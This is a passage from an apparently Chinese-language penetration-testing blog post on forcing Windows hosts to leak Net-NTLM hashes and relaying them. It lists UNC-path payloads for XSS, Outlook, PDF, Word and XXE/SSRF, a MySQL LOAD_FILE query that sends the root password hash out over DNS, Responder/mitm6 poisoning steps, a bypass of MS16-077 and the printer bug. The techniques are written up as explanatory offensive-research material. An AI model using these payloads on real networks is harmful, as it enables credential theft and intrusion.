\hostshare  </span><br><span class="line">&gt; diskperf.exe \hostshare  </span><br><span class="line">&gt; dispdiag.exe <span class="literal">-out</span> \hostshare  </span><br><span class="line">&gt; doskey.exe /MACROFILE=\hostshare  </span><br><span class="line">&gt; esentutl.exe /k \hostshare  </span><br><span class="line">&gt; expand.exe \hostshare  </span><br><span class="line">&gt; extrac32.exe \hostshare  </span><br><span class="line">&gt; FileHistory.exe \hostshare <span class="comment">#(noisy, pops a gui)  </span></span><br><span class="line">&gt; findstr.exe * \hostshare  </span><br><span class="line">&gt; fontview.exe \hostshare <span class="comment">#(noisy, pops an error dialog)  </span></span><br><span class="line">&gt; fvenotify.exe \hostshare <span class="comment">#(noisy, pops an access denied error)  </span></span><br><span class="line">&gt; FXSCOVER.exe \hostshare <span class="comment">#(noisy, pops GUI)  </span></span><br><span class="line">&gt; hwrcomp.exe <span class="literal">-check</span> \hostshare  </span><br><span class="line">&gt; hwrreg.exe \hostshare  </span><br><span class="line">&gt; icacls.exe \hostshare   </span><br><span class="line">&gt; licensingdiag.exe <span class="literal">-cab</span> \hostshare  </span><br><span class="line">&gt; lodctr.exe \hostshare  </span><br><span class="line">&gt; lpksetup.exe /p \hostshare /s  </span><br><span class="line">&gt; makecab.exe \hostshare  </span><br><span class="line">&gt; msiexec.exe /update \hostshare /quiet  </span><br><span class="line">&gt; msinfo32.exe \hostshare <span class="comment">#(noisy, pops a &quot;cannot open&quot; dialog)  </span></span><br><span class="line">&gt; mspaint.exe \hostshare <span class="comment">#(noisy, invalid path to png error)  </span></span><br><span class="line">&gt; msra.exe /openfile \hostshare <span class="comment">#(noisy, error)  </span></span><br><span class="line">&gt; mstsc.exe \hostshare <span class="comment">#(noisy, error)  </span></span><br><span class="line">&gt; netcfg.exe <span class="literal">-l</span> \hostshare <span class="literal">-c</span> p <span class="literal">-i</span> foo</span><br></pre></td></tr></table></figure>

<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>利用xss构造</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;\\172.16.100.1\xss&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d96892dd9bacd006.png"></p>
<p>这种情况适用于IE和edge，其他浏览器不允许从http域跨到file域，以chrome为例</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b5e489638e741140.png"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;\\172.16.100.1\x&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>看到跳出认证框，我们也没抓到net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d831a54fc5c0ddf4.png"></p>
<p>不像smb请求直接用当然用户名和密码去登录，发起http请求时，除非该站点的域名位于企业内部网或存在于可信站点列表中。否则都会跳出认证框来让操作者再输入一次。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cf6050d471e1b07f.png"></p>
<p>当我们选择自动使用当前用户名和密码登录就能拿到用户的net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011c799b3a99410492.png"></p>
<p>就可以抓到用户net-ntlm hash了</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e21b083ca4f5bce3.png"></p>
<p>修改后的配置同样适用于chrome</p>
<p>那至今为止，在默认的配置情况底下，如果有xss，那构造的页面的效果有两种</p>
<ol>
<li>构造unc，访问smb 协议，但是这种方式的话就只有IE和edge能行</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;\\172.16.100.1\xss&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>构造http，访问http 协议，这种方式并不限制浏览器访问，但是除非该站点的域名位于企业内部网或存在于可信站点列表中，不然是不会使用系统默认的凭据进行登录的，会跳出认证框，让用户填写账号密码</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;//172.16.100.1\xss&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>第二点该站点的域名位于企业内部网也是行的，那如果我们可以修改控制域内的DNS是不是就可以动点手脚了。</p>
<p>在查看DNS的ACL的时候，我发现了一条规则</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0156594bf19f92141b.png"></p>
<p>认证用户都可以在DNS里面创建子对象，也就意味着如果我们是域内认证 用户的话，那我们就可以在域内添加域名。我们使用在kerberos篇里面提到过的Powermad里面的Invoke-DNSUpdate添加一条DNS记录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010acabe37759199fa.png"></p>
<p>然后将我们的payload 换成</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script  src=<span class="string">&quot;//xss\xss&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>由于此时的域名位于企业内部网，所以当用户触发xss的时候会以当前用户去认证，我们也就能拿到用户的net-ntlm hash。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fdbc50b54c937fa6.png"></p>
<h3 id="outlook"><a href="#outlook" class="headerlink" title="outlook"></a>outlook</h3><p>发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC。于是我们构造payload</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;\\172.16.100.1\outlook&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017426b6c5935ad70f.png"></p>
<p>当收件人打开outlook查看邮件的时候</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d0355f58c5bfc88e.png"></p>
<p>我们就收到net-ntlm hash了</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0149fd2b4bead9a8cb.png"></p>
<h3 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h3><p>PDF规范允许为GoTobe和GoToR条目加载远程内容。PDF文件可以添加一项功能，请求远程SMB服务器的文件。我们直接使用<a href="https://github.com/3gstudent/Worse-PDF">三好学生的脚本</a></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014e210fc585268122.png"></p>
<p>我们就收到net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013049dfc7f0793e76.png"></p>
<p>用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行。</p>
<p>在实际测试中使用Adobe</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017860f464c5a4b9c9.png"></p>
<p>发现会有提示</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a7438060c6b7fcad.png"></p>
<h3 id="office"><a href="#office" class="headerlink" title="office"></a>office</h3><p>首先新建一个word，贴近一张图片</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0177a0ec884d7c213f.png"></p>
<p>然后用7zip 打开(没测试其他软件，可自行测试)</p>
<p>进入word_rels，修改document.xml.rels</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b3ac738eafbe3ef8.png"></p>
<p>可以看到Target参数本来是本地的路径</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014b72910273a063aa.png"></p>
<p>修改为UNC路径，然后加上<code>TargetMode=&quot;External&quot;</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0122905cebda3dbc40.png"></p>
<p>当打开word的时候,我们就拿到net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016a7347543991009d.png"></p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>我们知道在MySQL注入的话，是可以通过带外通信把数据带出来。语法如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(SELECT password FROM mysql.user WHERE user=&#x27;root&#x27; LIMIT 1),&#x27;.mysql.ip.port.b182oj.ceye.io\\abc&#x27;));</span><br></pre></td></tr></table></figure>

<p>需要具备load_file权限，且没有secure_file_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)</p>
<p>仔细观察我们会发现LOAD_FILE是支持UNC路劲</p>
<p>我们构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;\\\\172.16.100.1\\mysql&#x27;);</span><br></pre></td></tr></table></figure>

<p>拿到net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0171522a2d96fbcc32.png"></p>
<h3 id="NBNS和LLMNR"><a href="#NBNS和LLMNR" class="headerlink" title="NBNS和LLMNR"></a>NBNS和LLMNR</h3><p>windows 解析域名的顺序是</p>
<ul>
<li>Hosts</li>
<li>DNS (cache &#x2F; server) </li>
<li>LLMNR</li>
<li>NBNS</li>
</ul>
<p>如果Hosts文件里面不存在，就会使用DNS解析。如果DNS解析失败，就会使用LLMNR解析，如果LLMNR解析失败，就会使用NBNS解析</p>
<h4 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h4><p>LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS。监听的端口为 UDP&#x2F;5355，支持 IP v4 和 IP v6 ，并且在 Linux 上也实现了此协议。其解析名称的特点为端到端，IPv4 的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。<br>LLMNR 进行名称解析的过程为：<br>检查本地 NetBIOS 缓存<br>如果缓存中没有则会像当前子网域发送广播<br>当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败<br>也就是说LLMNR并不需要一个服务器，而是采用广播包的形式，去询问DNS，跟ARP很像，那跟ARP投毒一样的一个安全问题就会出现。<br>当受害者访问一个不存在的域名的时候。比如 </p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0178e10676ee7a9570.png"></p>
<p>受害者在Hosts 文件里面没有找到，通过DNS解析失败。就会通过LLMNR协议进行广播。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01873898ea3999764e.png"></p>
<p>这个时候攻击者就发个响应包 hhhhhhhhhhhhhhhhhhhh对应的IP是x.x.x.x(这个ip是攻击者IP)进行LLMNR投毒。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e58d8a5e0e57e925.png"></p>
<p>这一步可以通过Responder 实现。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01998bb4a24d971eb4.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b8e48d04d47ec360.png"></p>
<p>这个时候hhhhhhhhhhhhhhhhhhhh映射的ip就是攻击者的IP，当受害者访问hhhhhhhhhhhhhhhhhhhh就会访问攻击者的IP，攻击者就能拿到net-ntlm hash.</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ee5f89a57d2aabc0.png"></p>
<h4 id="NBNS"><a href="#NBNS" class="headerlink" title="NBNS"></a>NBNS</h4><p>全称是NetBIOS Name Service。</p>
<p>NetBIOS 协议进行名称解析的过程如下：</p>
<ul>
<li>检查本地 NetBIOS 缓存</li>
<li>如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求</li>
<li>如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播</li>
<li>如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件</li>
</ul>
<p>lmhosts 文件位于C:\Windows\System32\drivers\etc\目录中。</p>
<p>NetBIOS 协议进行名称解析是发送的 UDP 广播包。因此在没有配置 WINS 服务器的情况底下，LLMNR协议存在的安全问题，在NBNS协议里面同时存在。使用Responder也可以很方便得进行测试。这里不再重复展示。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ad13328225f1055f.png"></p>
<h3 id="WPAD和mitm6"><a href="#WPAD和mitm6" class="headerlink" title="WPAD和mitm6"></a>WPAD和mitm6</h3><p>wpad 全称是Web Proxy Auto-Discovery Protocol ，通过让浏览器自动发现代理服务器，定位代理配置文件PAC(在下文也叫做PAC文件或者wpad.dat)，下载编译并运行，最终自动使用代理访问网络。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013131844a42207684.png"></p>
<p>默认自动检测设置是开启的。<br>PAC文件的格式如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">FindProxyForURL</span><span class="params">(url, host)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (url== <span class="string">&#x27;http://www.baidu.com/&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;DIRECT&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span> (host== <span class="string">&#x27;twitter.com&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;SOCKS 127.0.0.10:7070&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span> (dnsResolve(host) == <span class="string">&#x27;10.0.0.100&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;PROXY 127.0.0.1:8086;DIRECT&#x27;</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;DIRECT&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WPAD的一般请求流程是(图片来源乌云drop)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019d8c1f08fefc8c39.png"></p>
<p>用户在访问网页时，首先会查询PAC文件的位置，然后获取PAC文件，将PAC文件作为代理配置文件。</p>
<p>查询PAC文件的顺序如下：</p>
<ol>
<li>通过DHCP服务器</li>
<li>查询WPAD主机的IP<ul>
<li>Hosts</li>
<li>DNS (cache &#x2F; server) </li>
<li>LLMNR</li>
<li>NBNS</li>
</ul>
</li>
</ol>
<p>这个地方就涉及到两种攻击方式</p>
<h4 id="配合LLMNR-x2F-NBNS投毒"><a href="#配合LLMNR-x2F-NBNS投毒" class="headerlink" title="配合LLMNR&#x2F;NBNS投毒"></a>配合LLMNR&#x2F;NBNS投毒</h4><p>这是最早的攻击方式。用户在访问网页时，首先会查询PAC文件的位置。查询的地址是WPAD&#x2F;wpad.dat。如果没有在域内专门配置这个域名的话，那么DNS解析失败的话，就会使用LLMNR发起广播包询问WPAD对应的ip是多少,这个时候我们就可以进行LLMNR投毒和NBNS投毒。Responder可以很方便得实现。</p>
<ol>
<li>受害者通过llmnr询问wpad主机在哪里，Responder通过llmnr投毒将wpad的ip指向Responder所在的服务器</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f3f53d4bece5aeb.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0117f2b2b74492c155.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018824534b07fca64e.png"></p>
<ol start="2">
<li>受害者访问WPAD&#x2F;wpad.dat，Responder就能获取到用户的net-ntlm hash(这个Responder默认不开，因为害怕会有登录提醒，不利于后面的中间人攻击，可以加上-F 开启)</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019a47eced2dde37b8.png"></p>
<p>然后Responder通过伪造如下pac文件将代理指向 ISAProxySrv:3141。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">FindProxyForURL</span><span class="params">(url, host)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ((host == <span class="string">&quot;localhost&quot;</span>) </span><br><span class="line">      || shExpMatch(host, <span class="string">&quot;localhost.*&quot;</span>) </span><br><span class="line">      ||(host == <span class="string">&quot;127.0.0.1&quot;</span>) </span><br><span class="line">      || isPlainHostName(host)) <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span> (dnsDomainIs(host, <span class="string">&quot;RespProxySrv&quot;</span>)</span><br><span class="line">      ||shExpMatch(host, <span class="string">&quot;(*.RespProxySrv|RespProxySrv)&quot;</span>)) </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>; </span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;PROXY ISAProxySrv:3141; DIRECT&#x27;</span>;&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>受害者会使用ISAProxySrv:3141作为代理，但是受害者不知道ISAProxySrv对应的ip是什么，所以会再次查询，Responder再次通过llmnr投毒进行欺骗。将ISAProxySrv指向Responder本身。然后开始中间人攻击。这个时候可以做的事就很多了。比如插入xss payload获取net-ntlm hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等，Responder都支持。这里就不详细展开了。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0117f2b2b74492c155.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018c07f17c72927703.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016ba5e76024598fbc.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015a010924cea2849f.png"></p>
<p>然而，微软在2016年发布了<a href="https://support.microsoft.com/en-us/topic/ms16-077-security-update-for-wpad-june-14-2016-2490f086-dc17-4a6e-2799-a974d1af385e">MS16-077</a>安全公告，添加了两个重要的保护措施，以缓解这类攻击行为：</p>
<p>1、系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。</p>
<p>2、更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。</p>
<h4 id="配合DHCPv6"><a href="#配合DHCPv6" class="headerlink" title="配合DHCPv6"></a>配合DHCPv6</h4><p>前面说过，针对在查询WPAD的时候进行投毒欺骗这种攻击方式，微软添加了两个重要的保护措施</p>
<p>1、系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。</p>
<p>2、更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。</p>
<p>第二个保护措施比较好绕过，我们先来绕过这个。更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的域凭据来响应NTLM或协商身份验证质询。这个其实比较好解决，在访问pac文件的时候，我们没办法获取到用户的net-ntlm hash。其实默认responder就不想在这一步获取net-ntlm hash，他默认不开启，要手动加-F选项才能开启。我们可以给用户返回一个正常的wpad。将代理指向我们自己，然后我们作为中间人。这个时候可以做的事就很多了。比如插入xss payload获取net-ntlm hash，中间人获取post，cookie等参数，通过basic认证进行钓鱼，诱导下载exe等等。这个可以回去上一小节配合LLMNR&#x2F;NBNS投毒看看。</p>
<p>在网上也有一种比较巧妙的绕过姿势。我们可以给用户返回一个正常的wpad。将代理指向我们自己，当受害主机连接到我们的“代理”服务器时，我们可以通过HTTP CONNECT动作、或者GET请求所对应的完整URI路径来识别这个过程，然后回复HTTP 407错误（需要代理身份验证），这与401不同，IE&#x2F;Edge以及Chrome浏览器（使用的是IE设置）会自动与代理服务器进行身份认证，即使在最新版本的Windows系统上也是如此。在Firefox中，用户可以配置这个选项，该选项默认处于启用状态。</p>
<p>所以我们接下来的任务是要来绕过第一个保护措施</p>
<blockquote>
<p>系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP选项或DNS协议完成该任务。</p>
</blockquote>
<p>这个就保证了llmnr投毒和nbns投毒不能用了。我们来回顾下用户获取pac文件的一般流程。</p>
<ol>
<li>通过DHCP服务器</li>
<li>查询WPAD主机的IP<ul>
<li>Hosts</li>
<li>DNS (cache &#x2F; server)</li>
<li>LLMNR</li>
<li>NBNS<br>在<a href="https://support.microsoft.com/en-us/topic/ms16-077-security-update-for-wpad-june-14-2016-2490f086-dc17-4a6e-2799-a974d1af385e">MS16-077</a>之后，通过DHCP和DNS协议还可以获取到pac文件。<br>DHCP和DNS都有指定的服务器，不是通过广播包，而且dhcp服务器和dns服务器我们是不可控的，没法进行投毒。<br>幸运的是安全研究人员并不将目光局限在ipv4，从Windows Vista以来，所有的Windows系统（包括服务器版系统）都会启用IPv6网络，并且其优先级要高于IPv4网络。这里我们要用到DHCPV6协议。<br>DHCPv6协议中，客户端通过向组播地址发送Solicit报文来定位DHCPv6服务器，组播地址[ff02::1:2]包括整个地址链路范围内的所有DHCPv6服务器和中继代理。DHCPv6四步交互过程，客户端向[ff02::1:2]组播地址发送一个Solicit请求报文，DHCP服务器或中继代理回应Advertise消息告知客户端。客户端选择优先级最高的服务器并发送Request信息请求分配地址或其他配置信息，最后服务器回复包含确认地址，委托前缀和配置（如可用的DNS或NTP服务器）的Relay消息。通俗点来说就是，在可以使用ipv6的情况(Windows Vista以后默认开启),攻击者能接收到其他机器的dhcpv6组播包的情况下，攻击者最后可以让受害者的DNS设置为攻击者的IPv6地址。<br>Fox-IT公布了名为<a href="https://github.com/dirkjanm/mitm6">mitm6</a>的一个工具，可以实施这种攻击。<br>mitm6首先侦听攻击者计算机的某个网卡上的DHCPV6流量。</li>
</ul>
</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01790566498077fb89.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e450d84acb5b4886.png"></p>
<p>当目标计算机重启或重新进行网络配置（如重新插入网线）时， 将会向DHCPv6发送请求获取IPv6配置</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0107c2b3399eb8c7e9.png"></p>
<p>这个时候mitm6将回复这些DHCPv6请求，并在链接本地范围内为受害者分配一个IPv6地址。尽管在实际的IPv6网络中，这些地址是由主机自己自动分配的，不需要由DHCP服务器配置，但这使我们有机会将攻击者IP设置为受害者的默认IPv6 DNS服务器。应当注意，mitm6当前仅针对基于Windows的操作系统，因为其他操作系统（如macOS和Linux）不使用DHCPv6进行DNS服务器分配。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016c35bea3e45cabc3.png"></p>
<p>这个时候受害者的dns 服务器的地址已经设置为攻击者的IPv6地址。一旦受害机器将攻击者设置为IPv6 DNS服务器，它将立即开始查询网络的WPAD配置。由于这些DNS查询是发送给攻击者的，因此攻击者仅可以使用自己的IP地址作为WPAD对应的IP地址。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018d19d568176b275a.png"></p>
<p>至此MS16-077的两个保护措施都能绕过，再遇到MS16-077之后的机子不妨试试这种方法。</p>
<h3 id="XXE-amp-amp-SSRF"><a href="#XXE-amp-amp-SSRF" class="headerlink" title="XXE &amp;&amp; SSRF"></a>XXE &amp;&amp; SSRF</h3><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>在xxe里面加载外部文件的时候，如果路径支持unc路径的话，是能拿到net-ntlm hash的。</p>
<p>这里使用javajavax.xml.parsers进行测试,测试代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">Document doc = db.parse(request.getInputStream());</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0196371e3c0a838947.png"></p>
<p>成功打回net-ntlm hash</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0148cdbaede51f0c63.png"></p>
<p>如果不支持UNC，可再测试http协议</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a738a620adf08b5f.png"></p>
<p>成功打回net-ntlm hash。</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>在ssrf里面如果支持file协议，并且file协议能加载远程资源的话，是能拿到net-ntlm hash的。</p>
<p>这里使用JAVA的HttpURLConnection进行测试，测试代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line"><span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">httpUrl</span> <span class="operator">=</span> (HttpURLConnection)urlConnection;</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(httpUrl.getInputStream()));</span><br></pre></td></tr></table></figure>

<p>当只支持HTTP协议的时候，也是可能打回net-ntlm hash的。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d47c4970589d80b9.png"></p>
<p>成功打回net-ntlm hash</p>
<p>各个语言触发XXE和SSRF的实现不同。同一门语言也有不同的触发方式，这里并没有一一测试。</p>
<p>只要支持UNC路径都能打回net-ntlm hash,如果支持http的话，得看底层实现，有些底层实现是需要判断是否在信任域的，有些底层实现是不需要判断是否信任域，有些需要判断是否信任域里面，但是判断是否在信任域的代码是这样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DefaultNTLMAuthenticationCallback</span> <span class="keyword">extends</span> <span class="title class_">NTLMAuthenticationCallback</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isTrustedSite</span><span class="params">(URL url)</span> &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在xxe和ssrf测试中一般要测试这两个方面:</p>
<ol>
<li>支不支持UNC路径，比如\ip\x或者file:&#x2F;&#x2F;ip&#x2F;x</li>
<li>支不支持HTTP(这个一般支持),是不是需要信任域，信任域是怎么判断的</li>
</ol>
<p>各个语言，各个模块的测试，这里并没有一一测试。</p>
<h3 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h3><p>Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。</p>
<p>任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。</p>
<p>如下图，使用printerbug.py对172.16.100.5发起请求，172.16.100.5就会向172.16.100.1发起ntlm 请求。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0194265565e1e16f3a.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b973a1501589a825.png"></p>
<h2 id="Net-NTLM-利用"><a href="#Net-NTLM-利用" class="headerlink" title="Net- NTLM 利用"></a><h2 id='p6'>Net- NTLM 利用</h2></h2><h3 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h3><p>在上一章节中,讲了12种发起NTLM请求的方式。这块接着上文，主要讲解拿到NTLM 请求之后的进一步利用。有Net-NTLM Hash的破解(v1 和 v2)以及Relay到支持NTLM SSP的协议，事实上，只要是支持NTLM SSP的协议，都可以Relay过去，本文主要讲的是几种比较常遇到，且能达到命令执行效果的，SMB,EWS,LDAP。</p>
<h3 id="Relay"><a href="#Relay" class="headerlink" title="Relay"></a>Relay</h3><h4 id="Relay2SMB"><a href="#Relay2SMB" class="headerlink" title="Relay2SMB"></a>Relay2SMB</h4><p>能直接relay到smb服务器，是最直接最有效的方法。可以直接控制该服务器(包括但不限于在远程服务器上执行命令，上传exe到远程命令上执行，dump 服务器的用户hash等等等等)。</p>
<p>主要有两种场景</p>
<ol>
<li><p>工作组环境<br>这个实用性比较差。在工作组环境里面，工作组中的机器之间相互没有信任关系，每台机器的账号密码Hash只是保存在自己的SAM文件中，这个时候Relay到别的机器，除非两台机器的账号密码一样(如果账号密码一样，我为啥不直接pth呢)，不然没有别的意义了，这个时候的攻击手段就是将机器reflect回机子本身。因此微软在ms08-068中对smb reflect到smb 做了限制。这个补丁在CVE-2019-1384(Ghost Potato)被绕过。将在下一部分里面详细讲。</p>
</li>
<li><p>域环境<br>域环境底下域用户的账号密码Hash保存在域控的 ntds.dit里面。如下没有限制域用户登录到某台机子，那就可以将该域用户Relay到别人的机子，或者是拿到域控的请求，将域控Relay到普通的机子，比如域管运维所在的机子。(为啥不Relay到其他域控，因为域内就域控默认开启smb签名)</p>
</li>
</ol>
